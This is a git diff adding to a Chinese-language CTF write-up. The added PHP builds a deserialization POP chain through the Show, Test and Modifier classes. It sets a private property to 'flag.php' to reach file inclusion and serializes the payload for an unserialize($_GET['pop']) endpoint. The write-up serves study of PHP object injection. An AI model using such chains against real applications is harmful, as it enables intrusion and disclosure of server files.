@@ -54,6 +54,34 @@ if(isset($_GET['pop'])){    unserialize($_GET['pop']);
 -5.`class Show`里面的`tostring`则有一连串调用，将`str`实例化一个对象`Test`即可
 -6.调用`tostring`，则剩下`wakeup`没被调用，此时只需要反序列化即可调用，并且将`Show->source`赋值为当前类即可
 
+构造如下
 ```php
+$a = new Show();
+$a->source = new Show();//echo对象，触发show里面的tostring
+  
 
+$b = new Test();
+$a->source->str = $b;
+
+//触发test的get方法，也就是调用了不存在的对象，因此执行了后续赋值.注意，这里需要紧接上步$a->source，source现在是新的对象，因此需要再次调用source里面的str，而不能直接用$a->str
+
+//这里调用了tostring后this是source这个新的类，因此需要在source里面继续赋值str属性
+
+  
+
+$c = new Modifier();
+$b ->p = $c;//触发modifier的invoke方法
+
+
+//序列化对象
+echo serialize($a);
+$s = serialize($a);
+//注意构造时候将私有属性var直接更改
+private $var = 'flag.php';
+
+echo "\n";
+echo unserialize($s);
 ```
+
+![](assets/pop链构造/file-20260129164822214.png)
+
